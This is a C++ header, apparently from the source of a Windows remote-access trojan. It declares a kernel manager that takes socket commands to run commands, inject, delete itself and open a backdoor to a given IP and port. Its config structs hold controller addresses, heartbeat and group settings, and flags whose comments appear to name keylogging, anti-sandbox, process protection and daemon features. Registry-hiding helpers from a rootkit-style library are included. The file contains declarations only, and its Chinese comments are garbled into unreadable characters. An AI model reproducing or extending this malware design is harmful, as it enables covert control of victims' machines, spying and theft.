#pragma once
#include "Manager.h"
#include <Windows.h>
#include <iostream>
#include <stdlib.h>
#include <Shlobj.h>
#include "HiddenLib.h"


enum
{
	COMMAND_KERNEL_INIT,
	COMMAND_KERNEL_GETSTATE,
	COMMAND_KERNEL_SETSTATE_CONTINUE,
	COMMAND_KERNEL_SETSTATE_PROCESS,
	COMMAND_KERNEL_SETSTATE_STOP,
	COMMAND_KERNEL_RUNCOMMAND,
	COMMAND_KERNEL_DELCOMMAND,
	COMMAND_KERNEL_WRITERCOMMAND,
	COMMAND_KERNEL_BACKDOOR,

	COMMAND_KERNEL_DEL,
	COMMAND_KERNEL_INJECT,
	TOKEN_KERNEL_RETURNINFO,
};

enum 
{
	INITSUC,
	INITUNSUC,


	COMMANDERROR,

};

struct BACKDOOR
{
	BYTE Token;
	TCHAR ip[255];
	TCHAR port[30];
};


struct RETURNINFO
{
	BYTE Token;
	BYTE mode;
	TCHAR info[1024];
};

struct RUNCOMMAND
{
	BYTE Token;
	int  argc;
	TCHAR Command[1024];
};

struct Function
{
	BOOL IsKeyboard;		//�������߼�¼
	BOOL IsAntiSimulation;	//��ɳ��
	BOOL ProtectedProcess;	//���̱���
	BOOL antinet;			//��������
	BOOL RunDllEntryProc;	//�Ƿ�����DLL���

	BOOL  Processdaemon;	//�����ػ�
	BOOL  puppet;			//���ܽ���
	BOOL  special;			//�ر�
	BOOL  bool4;	//����
	BOOL  bool5;	//����


	TCHAR other1[255];  //����
	TCHAR other2[255];  //����
	TCHAR other3[255];  //����
	TCHAR other4[255];	//����
	TCHAR other5[255];  //����
};


struct Info
{
	char mark[30];		//���
	TCHAR szAddress[255];  //ip
	TCHAR szPort[30];		//�˿�
	BOOL IsTcp;			//ͨ��ģʽ
	TCHAR szAddress2[255];  //ip
	TCHAR szPort2[30];		//�˿�
	BOOL IsTcp2;			//ͨ��ģʽ
	TCHAR szAddress3[255];  //ip
	TCHAR szPort3[30];		//�˿�
	BOOL IsTcp3;			//ͨ��ģʽ
	TCHAR szRunSleep[30];	//���еȴ�����ʼ����ʱ�ȴ�ʱ�� ��ֹ�ֶ��鿴������أ�
	TCHAR szHeart[30];		//����ʱ��
	TCHAR szGroup[50];		//����
	TCHAR szVersion[50];	//�汾
	TCHAR Remark[50];		//��ע
	Function otherset;		//��������
};

class CKernelManager : public CManager
{
public:
	BOOL m_buser;
	CKernelManager(ISocketBase* pClient);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:

	void Initialize();
	void  GetState( );
	void SetState(HidActiveState state);


	void runcommand(int argc, TCHAR* Command);
	void delcommand(int argc, TCHAR* Command);
	void writercommand(int argc, TCHAR* Command);
protected:
	BOOL IsWindowsX64();
	void SendReturnInfo(BYTE mode ,TCHAR* info);

	HidContext m_context;
	HidContext GetContext();

	HidRegRootTypes GetTypeAndNormalizeRegPath(std::wstring& regPath);
	HidRegRootTypes GetRegType(std::wstring& path);
	void SetRegvalue(TCHAR* name, TCHAR* val, int nSize);
	bool GetMultiStrValue(const wchar_t* name, std::vector<std::wstring>& strs);
	bool SetMultiStrValue(const wchar_t* name, const std::vector<std::wstring>& strs);

	int memfind(const char* mem, const char* str, int sizem, int sizes);
	BOOL SetInternetStatus(bool enable);
};

